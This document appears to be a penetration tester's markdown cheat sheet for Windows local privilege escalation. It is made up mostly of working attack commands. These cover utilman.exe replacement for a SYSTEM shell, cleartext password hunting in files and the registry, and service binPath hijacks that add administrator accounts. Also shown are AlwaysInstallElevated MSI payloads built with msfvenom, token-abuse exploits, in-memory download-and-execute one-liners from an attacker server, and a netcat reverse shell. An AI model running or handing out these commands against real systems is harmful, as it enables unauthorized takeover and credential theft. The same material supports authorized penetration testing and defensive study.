# Windows - Local Privilege Escalation

### Enumeration

###### Basic enumeration

The following commands can be used to grasp a better understanding of the
current system:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **OS details**  | systeminfo | [environment]::OSVersion.Version |  |
| **OS Architecture** | echo %PROCESSOR_ARCHITECTURE% |  [Environment]::Is64BitOperatingSystem | wmic os get osarchitecture |
| **Hostname**  | hostname | $env:ComputerName<br/>(Get-WmiObject Win32_ComputerSystem).Name ||
| **Curent Domain** | echo %userdomain% | $env:UserDomain<br/>(Get-WmiObject Win32_ComputerSystem).Domain ||
| **Curent User**  | whoami /all<br/>net user %username%  | $env:UserName<br/>(Get-WmiObject Win32_ComputerSystem).UserName | |
| **List host local users**  | net users |  | wmic USERACCOUNT list full |
| **List host local groups** | net localgroup | *(Win10+)* Get-LocalGroup | wmic group list full |
| **Local admin users** | net localgroup Administrators | | |
| **Connected users** | qwinsta | | |
| **Powershell version**  | Powershell  $psversiontable | $psversiontable ||
| **Environement variables** | set | Get-ChildItem Env: &#124; ft Key,Value ||
| **Credential Manager** | cmdkey /list | | |
| **Mounted disks** | | | wmic volume get DriveLetter,FileSystem,Capacity |
| **Writable directories** | dir /a-rd /s /b | | |
| **Writable files** | dir /a-r-d /s /b | | | |

###### Enumeration scripts

Part of the enumeration process detailed below can be automated using scripts.

*Personal preference: `PowerSploit`'s `PowerUp` `Invoke-PrivescAudit` /
`Invoke-AllChecks` (requires PowerShell) & off-target `Windows Exploit Suggester`*

The PowerShell `PowerSploit`'s `PowerUp` `Invoke-PrivescAudit` /
`Invoke-AllChecks` runs a number of configuration checks:
  - Unquoted services path
  - Weak services permissions
  - "AlwaysInstallElevated" policy
  - ...

The PowerShell `PowerSploit`'s `PowerUp` can be loaded directly in memory
using PowerShell `DownloadString` or through a `meterpreter` session:

```
powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1’); Invoke-AllChecks”

PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
PS> Invoke-AllChecks

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Invoke-AllChecks
```

Refer to the "Unpatched system - Exploits detection tools" paragraphe below for
a detailed usage guide of `Windows Exploit Suggester`.  

### Physical access privileges escalation

Physical access open up different ways to bypass user login screen and
obtain SYSTEM access.

###### Hardened system

*BIOS settings*

The methods detailed below require to boot from a live CD/DVD or USB key. The
possibility to do so may be disabled by BIOS settings. To conduct the
attack below, an access to the BIOS or a reset to default settings must be
accomplished.  

Manufacturers may have defined a default BIOS password, some of which are
listed on the following resource
http://www.uktsupport.co.uk/reference/biosp.htm

Ultimately, BIOS settings can be reseted by removing the CMOS battery or using
the motherboard Jumper.

*Encrypted disk*

The methods detailed below require an access to the Windows file system and will
not work on encrypted partitions if the password to decrypt the file system is
not known.

###### PCUnlocker

`PCUnlocker` is a password-unlocking software that can be used to reset lost
Windows users password. it can be burn on a CD/DVD or installed on a bootable
USB key.

The procedure to create a bootable USB key and reset local Windows users
passwords is as follow:

  1. Download `Rufus` and `PCUnlocker`
  2. Create a bootable USK key using `Rufus` with the `PCUnlocker` ISO.  
     If making an USB key for a computer with UEFI BIOS, pick the "GPT partition
     scheme for UEFI computer" option on Rufus
  3. Boot on the USB Key thus created (boot order may need to be changed in
     BIOS)
  4. From the `PCUnlocker` GUI, pick an account and click the "Reset Password"
     button to reset the password to <PASSWORD>

To create a bootable CD/DVD, simply use any CD/DVD burner with the `PCUnlocker`
ISO and follow steps 3 & 4.  
If used on a Domain Controller, `PCUnlocker` can be used to reset Domain users
password by updating the `ntds.dit` file.

###### utilman.exe

The `utilman` utility tool can be launched at the login screen before
authentication as NT AUTHORITY\SYSTEM. By using a Windows installation CD/DVD,
it is possible to replace the `utilman.exe` by `cmd.exe` to gain access to a CMD
shell as SYSTEM without authentication.

The procedure to do so is as follow:

  1. Download the Windows ISO corresponding to the attacked system and burn it
     to a CD/DVD
  2. Boot on the thus created CD/DVD
  3. Pick the "Repair your computer" option
  4. Select the “Use recovery tools [...]" option, pick the operating system
     from the list and click "Next"
  5. A command prompt should open, enter the following commands:
      - cd windows\system32
      - ren utilman.exe utilman.exe.bak
      - copy cmd.exe utilman.exe
  6. Remove the CD/DVD and boot the system normally.
  7. On the login screen, press the key combination Windows Key + U
  8. A command prompt should open with NT AUTHORITY\SYSTEM rights
  9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new
  user

### Clear text passwords

###### Clear text passwords in files

The built-in `findstr` and `dir` can be used to search for clear text passwords
stored in files. The keyword 'password' should be used first and the search
broaden if needed by searching for 'pass'.

The `meterpreter` `search` command can be used in place of `findstr` if a
`meterpreter` shell is being used.

```
# Meterpreter search command
search -f <FILENAME>.<FILE_EXTENSION> <KEYWORD>
search -f *.* <KEYWORD>

# Search 'password' / 'pass' in all txt/xml/ini files
findstr /si "password" *.txt
findstr /si "password" *.xml
findstr /si "password" *.ini
findstr /si "pass" *.txt
findstr /si "pass" *.xml
findstr /si "pass" *.ini

# Search 'password'/'pass' in all files
findstr /spin "password" *.*
findstr /spin "pass" *.*
findstr /spin "savecred" *.*

# Search for runas with savecred in files
findstr /s /i /m "savecred" *.*
findstr /s /i /m "runas" *.*

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*
```

The following files, if present on the system, may contain clear text or base64
encoded passwords and should be reviewed:

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
dir /s /b *tnsnames*
dir /s /b *.ora*
```

###### Clear text password in registry

Passwords may also be stored in registry:

```
# runas

rundll32.exe keymgr.dll,KRShowKeyMgr

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
```

###### Hidden files

To display only hidden files, the following command can be used:

```
dir /s /ah /b
dir C:\ /s /ah /b

Get-Childitem -Recurse -Hidden
```

###### Files of interest

The following files may contains sensible information:

```
# PowerShell commands history
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Unpatched system

###### OS and Kernel version

The following commands or actions can be used to get the updates installed on
the host:

| DOS | Powershell | WMI |
|-----|------------|-----|
| systeminfo<br/> Check content of C:\Windows\SoftwareDistribution\Download<br/>type C:\Windows\WindowsUpdate.log | Get-HotFix | wmic qfe get Caption,Description,HotFixID,InstalledOn |

Automatically compare the system patch level to public known exploits:

###### Exploits detection tools

*Windows Exploit Suggester*

The `windows-exploit-suggester` tool compares a targets patch levels against the
Microsoft vulnerability database in order to detect potential missing patches
on the target.  
It also notifies the user if there are public exploits and `Metasploit` modules
available for the missing bulletins.  
It requires the `systeminfo` command output from a Windows host in order to
compare that the Microsoft security bulletin database and determine the patch
level of the host.  
It has the ability to automatically download the security bulletin database
from Microsoft with the --update flag, and saves it as an Excel spreadsheet.

```
# python windows-exploit-suggester.py --update

python /opt/priv_esc/windows/windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO>
```

If the `systeminfo` command reveals 'File 1' as the output for the hotfixes,
the output of `wmic qfe list full` shoudl be used instead using the --hotfixes
flag, along with the `systeminfo`:

```
python windows-exploit-suggester.py --database <XLS> --systeminfo <SYSTEMINFO> --hotfixes <HOTFIXES>
```

*Sherlock*

PowerShell script to find missing software patches for critical vulnerabilities
that could be leveraged for local privilege escalation.

To download and execute directly into memory:

```
# CMD
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1')"; Find-AllVulns

# PowerShell
IEX (New-Object Net.WebClient).DownloadString('http://<IP>:<Port>/Sherlock.ps1'); Find-AllVulns
```

*(Metasploit) Local Exploit Suggester*

The `local_exploit_suggester` module suggests local `meterpreter` exploits that
can be used against the target, based on the architecture and platform as well as
the available exploits in `meterpreter`.

 ```
meterpreter > run post/multi/recon/local_exploit_suggester

# OR

msf > use post/multi/recon/local_exploit_suggester
msf post(local_exploit_suggester) > set SESSION <session-id>
msf post(local_exploit_suggester) > run
```

###### Compilers

*mingw*

An exploit in C can be compiled on Linux to be used on a Windows system using
the cross-compiler `mingw`:

```
# 32 bits
i686-w64-mingw32-gcc -o exploit.exe exploit.c

# 64 bits
x86_64-w64-mingw32-gcc -o exploit.exe exploit.c
```

*PyInstaller*

If an exploit is only available as a Python script and Python is not installed
on the target, `PyInstaller` can be used to compile a stand alone executable of
the Python script:

```
pyinstaller --onefile <SCRIPT>.py
```

`PyInstaller` should be used on a Windows operating system.

### Services misconfigurations

In Windows NT operating systems, a Windows service is a computer program that
operates in the background, similarly in concept to a Unix daemon.

A Windows service must conform to the interface rules and protocols of the
Service Control Manager, the component responsible for managing Windows
services. Windows services can be configured to start with the operating system,
manually or when an event occur.

Vulnerabilities in a service configuration could be exploited to execute code
under the privileges of the user starting the service, often
NT AUTHORITY\SYSTEM.

###### Weak services permissions

A weak service permissions vulnerability occurs when an unprivileged user can
alter the service configuration or the service binary so that the service runs a
specified command or executable.  

The `accesschk` tool, from the `Sysinternals` suite, and the `Powershell`
`PowerUp` script can be used to list the services an user can exploit:

```
# Shows which services can be altered by the specified user
accesschk.exe -accepteula -uwcqv <USERNAME> *
accesschk64.exe -accepteula -uwcqv <USERNAME> *

# Shows which services can be altered by everyone
accesschk.exe -accepteula -uwcqv "Everyone" *
accesschk64.exe -accepteula -uwcqv "Everyone" *
accesschk.exe -accepteula -uwcqv "Tout le monde" *
accesschk64.exe -accepteula -uwcqv "Tout le monde" *

# Shows groups which can alter the service
accesschk.exe -accepteula -uwcqv *
accesschk64.exe -accepteula -uwcqv *

# (PowerShell) PowerSploit's PowerUp Get-ModifiableServiceFile & Get-ModifiableService
# Get-ModifiableServiceFile - returns services for which the current user can directly modify the binary file
# Get-ModifiableService - returns services the current user can reconfigure
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
PS> Get-ModifiableServiceFile
PS> Get-ModifiableService

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Get-ModifiableServiceFile
meterpreter> powershell_execute Get-ModifiableService
```

The exploitable permissions are:

```
SERVICE_CHANGE_CONFIG
SERVICE_ALL_ACCESS F
GENERIC_WRITE / GW
GENERIC_ALL / GA
WRITE_DAC / WDAC
WRITE_OWNER / WO
```

To alter the service configuration:

```
# A space is required after binPath=
sc config <SERVICE_NAME> binPath= "net user <USERNAME> <PASSWORD> /add"
sc config <SERVICE_NAME> binPath= "net localgroup administrators <USERNAME> /add"
sc config <SERVICE_NAME> binPath= "<NEW_BIN_PATH>"

# If needed, start the service under Local Service account
sc config <SERVICE_NAME> obj= ".\LocalSystem" password= ""
sc config <SERVICE_NAME> obj= "\Local Service" password= ""
sc config <SERVICE_NAME> obj="NT AUTHORITY\LocalService" password= ""
```

The `Metasploit` module `exploit/windows/local/service_permissions` can be used
through an existing `meterpreter` session to automatically detect and exploit
weak services permissions to execute a specified payload under NT
AUTHORITY\SYSTEM privileges.

###### Unquoted services path

When a service path is unquoted, the Service Manager will try to find the
service binary in the shortest path, moving up to the longest path until one
works.     
For example, for the path C:\Service Folder\Service_binary.exe, the space
is treated as an optional path to explore for that service. The resolution
process will first look into C:\ for the Service.exe binary and, if it
exist, use it to start the service.  

Here is Windows’ chain of thought for the above example:

1. Are they asking me to run  
   "C:\Service.exe" Folder\Service_binary.exe  
   No, it does not exist.

2. Are they asking me to run  
   "C:\Service Folder\Service_binary.exe"  
   Yes, it does exist.

In summary, a service is vulnerable if the path to the executable contains
spaces and the path is not wrapped in quote marks ; exploitation
requires write permissions to the path before the quote mark.

In the example, if an attacker has write privilege in C:\, he could create a
C:\Service.exe and escalate its privileges to the level of the account that
starts the service.  

To find vulnerable services the `wmic` tool and the `Powershell` `PowerUp`
script can be used as well as a manual review of each service metadata using
`sc` queries:

```
# List services
sc query
# Specified service metadata
sc qc <SERVICENAME>

# wmic
wmic service get PathName, StartMode | findstr /i /v "C:\\Windows\\" | findstr /i /v """
wmic service get PathName, StartMode | findstr /i /v """
wmic service get name.pathname,startmode | findstr /i /v """ | findstr /i /v "C:\\Windows\\"
wmic service get name.pathname,startmode | findstr /i /v """

# (PowerShell) PowerSploit's PowerUp Get-ServiceUnquoted
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
PS> Get-ServiceUnquoted

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Get-ServiceUnquoted
```

The `Metasploit` module `exploit/windows/local/trusted_service_path` can be used
through an existing `meterpreter` session to automatically detect and exploit
weak services permissions to execute a specified payload under NT
AUTHORITY\SYSTEM privileges.

###### misc

*Add a local administrator user*

The following C code can be used to add a local administrator user:

```
#include <stdlib.h>

int main() {
  int i;
  i = system("net user <USERNAME> <PASSWORD> /add");
  i = system("net localgroup administrators <USERNAME> /add");
  return 0;
}
```

The C code above can be compiled on Linux using the  cross-compiler `mingw`
(refer to cross compilation above).

*Reverse shell*

The service can be leveraged to start a privileged reverse shell. Refer to the
`[General] Shells - Binary` note.  

*Service restart*

To restart the service:

```
# Stop
net stop <SERVICE_NAME>
Stop-Service -Name <SERVICE_NAME> -Force

# Start
net start <SERVICE_NAME>
Start-Service -Name <SERVICE_NAME>
```

If an error `System error 1068` ("The dependency service or group failed to
start."), the dependencies can be removed to fix the service:

```
sc config <SERVICE_NAME> depend= ""
```

### AlwaysInstallElevated policy

Windows provides a mechanism which allows unprivileged user to install Windows
installation packages, Microsoft Windows Installer Package (MSI) files,
with NT AUTHORITY\SYSTEM privileges. This policy is known as
`AlwaysInstallElevated`.

If activated, this mechanism can be leveraged to elevate privileges on the
system by executing code through the MSI during the installation process as
NT AUTHORITY\SYSTEM.    

The Windows builtin `req query` and the the `Powershell` `PowerUp` script can
be used to check whether the `AlwaysInstallElevated` policy is deployed on the
host be querying the registry:

```
# If "REG_DWORD 0x1" is returned the policy is activated
# If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
PS> Get-RegistryAlwaysInstallElevated

meterpreter> load powershell
meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
meterpreter> powershell_execute Get-RegistryAlwaysInstallElevated
```

The policy can be abused through a `meterpreter` session using the `Metasploit`
module `exploit/windows/local/always_install_elevated`, by crafting a MSI with
`msfvenom` or using the `Powershell` `PowerUp` script.

Note that the `Metasploit` module
`exploit/windows/local/always_install_elevated` will prevent the installation
from succeeding to avoid the registration of the program on the system.  

```
# Requires a meterpreter session
msf> use exploit/windows/local/always_install_elevated

# msfvenom can be used to generate a MSI starting a Metasploit payload or using a provided binary  
# Refer to the "[General] Shells" note for generating binaries that can bypass anti-virus detection
# Refer to the "[General] File transfer" note for file transfer techniques to upload the MSI on the targeted system

msfvenom -p <PAYLOAD> -f msi-nouac > <MSI_FILE>
msfvenom -p windows/exec cmd="<BINARY_PATH>" -f msi-nouac > <MSI_FILE>

# /quiet: no messages displayed, /qn: no GUI, /i runs as current user
msiexec /quiet /qn /i <MSI_PATH>

# (PowerShell) PowerSploit's PowerUp Write-UserAddMSI
# Prompt a GUI interface to specify the user to be added
PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
erSploit/master/Privesc/PowerUp.ps1")
PS> Write-UserAddMSI
```

### Token Privileges abuse

###### Vulnerable privileges

Use the following command to retrieve the current user account token privileges:

```
whoami /priv
```

The following tokens can be exploited to gain SYSTEM access privileges:
- SeImpersonatePrivilege
- SeAssignPrimaryPrivilege
- SeTcbPrivilege
- SeBackupPrivilege
- SeRestorePrivilege
- SeCreateTokenPrivilege
- SeLoadDriverPrivilege
- SeTakeOwnershipPrivilege
- SeDebugPrivilege

###### Rotten Potato x64 w/ Metasploit

`RottenPotato` can be used in combination with the `Metasploit` `meterpreter`
incognito module to abuse the privileges above in order to elevate privilege to
SYSTEM.

Source: https://github.com/breenmachine/RottenPotatoNG

```
# Load the incognito module to toy with tokens
meterpreter > load incognito

# Upload the MSFRottenPotato binary on the target
# Some obfuscation may be needed in order to bypass AV
meterpreter > upload MSFRottenPotato.exe .

# The command may need to be run a few times
meterpreter > execute -f 'MSFRottenPotato.exe' -a '1 cmd.exe'

# The NT AUTHORITY\SYSTEM token should be available as a delegation token
# Even if the token is not displayed it might be available and the impersonation should be tried anyway
meterpreter > list_tokens -u
meterpreter > impersonate_token 'NT AUTHORITY\SYSTEM'
```

###### LonelyPottato (RottenPotato w/o Metasploit)

###### Tater

`Tater` is a `PowerShell` implementation of the Hot Potato Windows Privilege
Escalation exploit.

```
# Import module (Import-Module or dot source method)
Import-Module ./Tater.ps1
. ./Tater.ps1

# Trigger (Default = 1): Trigger type to use in order to trigger HTTP to SMB relay.
0 = None, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled Task

Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup administrators <USERNAME> /add"

# Memory injection and run
powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
```

### Credentials re-use

To use another user credentials, `psexec` can be used to start a CMD shell or
start a reverse shell:

```
# Use the -s option if the user provided is member of the administrators group
psexec.exe -s -i -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD>
psexec.exe -s -d -u <DOMAIN/LOCAL>\<USERNAME> -p <PASSWORD> <FULLPATH/nc.exe> -e cmd.exe <IP> <PORT>
```

### Administrator to SYSTEM

The NT AUTHORITY\ SYSTEM account and the administrator account (Administrators
group) have the same file privileges, but they have different functions.  
The system account is used by the operating system and by services that run
under Windows. It is an internal account, does not show up in User Manager,
cannot be added to any groups, and cannot have user rights assigned to it.  
The system account is needed by tools that make us of Debug Privilege
(such as `mimikatz`) which allows someone to debug a process that they wouldn’t
otherwise have access to.

The `PsExec` Microsoft signed tool can be used to elevate to system privilege
from an administrator account:

```
# -s   Run the remote process in the System account.
# -i   Run the program so that it interacts with the desktop of the specified session on the remote system
# -d   Don't wait for process to terminate (non-interactive).

psexec.exe -accepteula -s -i -d cmd.exe
```

If a `meterpreter` shell is being used, the `getsystem` command can be
leveraged to the same end.

### TODO

###### Process, services, installed programs and scheduled tasks

The following commands can be used to retrieve the process, services,
installed programs and scheduled tasks of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **Process** | tasklist | Get-Process<br/>Get-CimInstance Win32_Process &#124; select ProcessName, ProcessId &#124; fl *<br/>Get-CimInstance Win32_Process -Filter "name = 'PccNTMon.exe'" &#124; fl * | wmic process get CSName,Description,ExecutablePath,ProcessId |

###### Network

The following commands can be used to retrieve information about the network
interfaces and active connections of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| Network interfaces | ipconfig | | |
| Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |
